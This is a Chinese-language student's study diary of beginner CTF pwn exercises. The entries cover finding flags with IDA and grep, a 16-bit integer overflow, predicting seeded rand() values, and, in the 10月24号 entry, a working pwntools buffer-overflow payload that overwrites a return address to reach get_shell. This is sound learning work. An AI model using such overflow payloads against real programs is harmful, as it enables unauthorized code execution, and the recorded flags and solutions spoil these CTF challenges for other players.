# 26-pwn-lavender-1020
## 进一步了解pwn
##### 图床研究ing
## 10月20号
##### 前面有好多东西忘填了，补一下!
### 解决P0
#### 先把文件USE YUOR IDA拖进我的虚拟机，在用终端打开
#### *like this*
![alt text](<Screenshot 2026-10-20 141200.png>)
#### 检查保护！
[alt text](<Screenshot 2026-10-20 142424.png>)
#### 正如题目，需要我用到ida。but打开ida后无从下手？
#### 回到虚拟机，寻找字节偏移，再将其转化为十六进制
![alt text](<Screenshot 2026-10-20 141402.png>)
#### 在返回ida输入地址（应该叫这个叭），从而找到flag
#### **flag{how_to_start_pwn}
![alt text](<Screenshot 2026-10-20 141426.png>)
#### 小结
##### *可以直接搜明文 grep -abo 'flag{'*
##### *学会看出16进制，以及学会怎么转换 （printf '0x%x\n' 目标）* 

## 10月22号
#### **INTbug**
#### 老样子打开虚拟机，运行一下
#### 依旧检查安全性
#### 把文件丢尽ida
![alt text](<Screenshot 2026-10-25 211942.png>)
#### 看一下伪代码 
![alt text](<Screenshot 2026-10-25 210354.png>)
#### 发现_int16 v1:记录循环次数的v1是16 位有符号整数，范围 -32768 ~ 32767，所以翻译一下，随机输入正数32767次后，再输入一次，v1就超出了范围，此时v1 = -32768，v1<0,符合循环结束要求，退出循环，得到flag
![alt text](<Screenshot 2026-10-25 211851.png>)
#### 小结
##### *对_int16的理解，理清楚其范围*
##### __int8	char	1	-128 ~ 127
##### __int16	short	2	-32768 ~ 32767
##### __int32	int	4	-21亿 ~ 21亿
##### __int64	long long	8	很大
##### *看懂while循环*
##### *遇事不行就丢ida，顺便看眼伪代码*   awa
##### *也不忘了安全性检测~*

## 10月23号
#### **random**
#### 依旧老样子
#### 没strip，oka能直接看函数
#### oka 翻一下就看到了get_shell
![alt text](<Screenshot 2026-10-25 233944.png>)
![alt text](<Screenshot 2026-10-25 234741-1.png>)
#### 直接搜没找到flag（
#### 丢进ida
##### 这main是个啥，没看懂
![alt text](<Screenshot 2026-10-25 235012.png>)
#### 根据vuln部分，其伪代码可知 srand（57）
#### 种子是57
#### oka，现在是毫无头绪了awq
#### ！大肥鱼神力
#### 了解到：rand() 不是真随机，是伪随机数生成器：给定同一个种子，序列永远一样，每次运行、每台机器、甚至打远程，第一个值都是 1956681178
#### 接着大肥鱼讲到了栈，好叭，就是一个暂时储存数据的，but我是真不会怎么去看...宣告去世awq
#### 题目让我去学习一下随机数的机制，了解什么是撞库，以及‘这两题需要一点ret2libc的知识，可以学完ret2libc后再做’
#### 恶

## 10月24号
#### **random 2.0**
#### 昨天已经得到了第一部分的答案 1956681178
#### 第二部分？得到偏移量72（大肥鱼帮我整出来的awa），vuln（）执行完后，再跳到返回地址，so，把返回地址改成get_shell的地址
#### ok剩下的是一点也不懂恶，慢慢学叭
#### 这段是大肥鱼给我编的
##### 尝试理解ing
#### python3 -c“” 把引号里的内容当成 Python 程序执行，不用建文件
#### import sys, time	用系统输出、用 sleep
#### from pwn import p64	把数字打包成 8 字节
#### payload = ...	拼出溢出数据
#### def send(data):	定义一个发送函数，后面调用 3 次
#### write(data)	把字节写到标准输出
#### flush()	立刻发出去，不要攒着
#### sleep(0.3)	等 0.3 秒，让程序处理完
#### python3 -c "
#### import sys, time
#### from pwn import p64
#### payload = b'A'*72 + p64(0x40028b) + p64(0x4008b2)

#### def send(data):
####    sys.stdout.buffer.write(data)
####    sys.stdout.buffer.flush()
####    time.sleep(0.3)

#### send(b'1956681178\n')      # ① 只发数字
#### send(payload + b'\n')      # ② 发 payload
#### send(b'cat flag\n')        # ③ 发命令
#### " | ./random
##### 力竭了，这咋写出来的a awq
#### oka也是极其艰难的做完了，恶恶恶恶恶恶

## 10月25号
#### **154440_pwn**
#### oka直接换一个题，上面那个不会，没招了awq
#### 先用file，checksec来看一下154440_pwn是个啥
#### 运行一下，它让我用libc，恶
#### 不知道填什么，直接丢进ida看一眼
#### mian函数，伪代码 v3 = time(timer: nullptr);   srand(seed: v3)
#### 好的，大致猜到数字跟时间有关了，嘿嘿嘿
#### 把main翻译成c语言
#### srand(time(0));
#### int count = 0;
#### for (int i = 0; i < 50; i++) {
####    int target = rand() % 53 + 7;// 7 ~ 59
####    scanf("%d", &guess);
####    if (guess != target) break;
####    if (++count == 50) { puts("Wow..."); system("/bin/sh"); }
####    }
#### 从程序运行的一刻开始计时，将时间作为密码，好吧，这挺让我犯难的
#### 不会了，学长救我qwq
#### 图床还在研究ing



